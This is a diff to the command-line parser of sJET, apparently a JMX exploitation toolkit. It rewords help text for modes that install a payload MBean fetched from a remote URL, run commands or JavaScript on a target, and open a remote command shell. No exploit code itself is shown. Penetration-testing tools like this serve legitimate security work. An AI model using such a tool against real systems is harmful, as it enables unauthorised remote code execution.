@@ -283,14 +283,14 @@ def arg_password_mode(args):
 
 
 # Base parser
-parser = argparse.ArgumentParser(description = 'description', epilog='By siberas', add_help=True)
+parser = argparse.ArgumentParser(description = 'sJET allows an easy exploitation of insecure JMX services', epilog='--- sJET - siberas JMX Exploitation Toolkit ------------------', add_help=True)
 parser.add_argument('targetHost', help='target IP address')
 parser.add_argument('targetPort', help='target JMX service port')
-parser.add_argument('password', help="the password to execute the payload")
+parser.add_argument('password', help="the required password to access the payload methods")
 subparsers = parser.add_subparsers(title='modes', description='valid modes', help='use ... MODE -h for help about specific modes')
 
 # Install mode
-install_subparser = subparsers.add_parser('install', help='install the payload on the target')
+install_subparser = subparsers.add_parser('install', help='install the payload MBean on the target')
 install_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
 install_subparser.add_argument('payload_port', help='port to load the payload')
 install_subparser.set_defaults(func=arg_install_mode)
@@ -306,12 +306,12 @@ command_subparser.add_argument('cmd', help='command to be executed')
 command_subparser.set_defaults(func=arg_command_mode)
 
 # Javascript mode
-script_subparser = subparsers.add_parser('javascript', help='execute a javascript from a file in the target')
-script_subparser.add_argument('filename', help='file with the javascript to be executed')
+script_subparser = subparsers.add_parser('javascript', help='execute JavaScript code from a file in the target')
+script_subparser.add_argument('filename', help='file with the JavaScript code to be executed')
 script_subparser.set_defaults(func=arg_script_mode)
 
 # Shell mode
-shell_subparser = subparsers.add_parser('shell', help='open a simple shell in the target')
+shell_subparser = subparsers.add_parser('shell', help='open a simple command shell in the target')
 shell_subparser.set_defaults(func=arg_shell_mode)
 
 # Store the user args
